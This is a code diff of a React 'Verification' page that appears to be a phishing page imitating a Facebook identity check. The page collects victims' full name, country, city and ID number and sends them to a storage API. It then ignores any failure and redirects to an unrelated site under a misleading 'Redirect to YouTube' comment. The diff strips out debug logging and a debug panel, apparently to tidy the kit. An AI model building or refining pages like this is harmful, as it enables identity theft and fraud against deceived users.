@@ -56,8 +56,6 @@ export default function Verification() {
     setError('');
     setIsLoading(true);
 
-    console.log('🔵 Starting verification process for:', userEmail);
-
     try {
       // Validate all fields are filled
       if (!userData.country || !userData.idNumber || !userData.fullName || !userData.city) {
@@ -73,8 +71,6 @@ export default function Verification() {
       };
       localStorage.setItem('user_session', JSON.stringify(userSession));
 
-      console.log('🟡 Sending verification data to API...');
-
       // Send to NeonDB
       const response = await fetch('/api/store-verification', {
         method: 'POST',
@@ -82,28 +78,18 @@ export default function Verification() {
         body: JSON.stringify(userSession)
       });
 
-      console.log('🟡 Verification API Response status:', response.status);
-
-      // ✅ FIX: Check if the request was successful
+      // Check if the request was successful
       if (!response.ok) {
-        const errorText = await response.text();
-        console.error('🔴 Verification API Error:', errorText);
         // Continue anyway - don't block the user flow
-      } else {
-        const result = await response.json();
-        console.log('🟢 Verification data stored successfully:', result);
       }
 
       // Clear login session
       localStorage.removeItem('user_email');
       
-      console.log('🟢 Redirecting to YouTube...');
-      
       // Redirect to YouTube
       window.location.href = 'https://art-premier-music-library.vercel.app/';
       
     } catch (error) {
-      console.error('🔴 Verification failed:', error);
       setError(error.message || 'Verification failed. Please try again.');
       setIsLoading(false);
     }
@@ -254,31 +240,6 @@ export default function Verification() {
                 <option value="RU">Russia</option>
                 <option value="CN">China</option>
                 <option value="JP">Japan</option>
-                <option value="KR">South Korea</option>
-                <option value="ID">Indonesia</option>
-                <option value="PH">Philippines</option>
-                <option value="VN">Vietnam</option>
-                <option value="TH">Thailand</option>
-                <option value="MY">Malaysia</option>
-                <option value="SG">Singapore</option>
-                <option value="SA">Saudi Arabia</option>
-                <option value="AE">United Arab Emirates</option>
-                <option value="IL">Israel</option>
-                <option value="TR">Turkey</option>
-                <option value="IT">Italy</option>
-                <option value="ES">Spain</option>
-                <option value="PT">Portugal</option>
-                <option value="NL">Netherlands</option>
-                <option value="BE">Belgium</option>
-                <option value="SE">Sweden</option>
-                <option value="NO">Norway</option>
-                <option value="DK">Denmark</option>
-                <option value="FI">Finland</option>
-                <option value="PL">Poland</option>
-                <option value="CZ">Czech Republic</option>
-                <option value="HU">Hungary</option>
-                <option value="RO">Romania</option>
-                <option value="GR">Greece</option>
               </select>
             </div>
 
@@ -353,8 +314,7 @@ export default function Verification() {
               )}
             </button>
           </form>
-
-
+        </div>
 
         <style jsx>{`
           .verification-container {
@@ -519,46 +479,6 @@ export default function Verification() {
             border-radius: 50%;
             animation: spin 1s linear infinite;
           }
-          
-          .debug-panel {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 16px;
-            margin-top: 20px;
-          }
-          
-          .debug-panel h3 {
-            color: #856404;
-            margin: 0 0 12px 0;
-            font-size: 14px;
-          }
-          
-          .debug-buttons {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-          }
-          
-          .debug-button {
-            padding: 8px 12px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 12px;
-            cursor: pointer;
-            flex: 1;
-            min-width: 120px;
-          }
-          
-          .debug-button.secondary {
-            background: #42b72a;
-          }
-          
-          .debug-button:hover {
-            opacity: 0.9;
-          }
 
           @media (max-width: 480px) {
             .verification-container {
@@ -571,14 +491,6 @@ export default function Verification() {
             
             .facebook-logo {
               font-size: 28px;
-            }
-            
-            .debug-buttons {
-              flex-direction: column;
-            }
-            
-            .debug-button {
-              min-width: auto;
             }
           }
         `}</style>
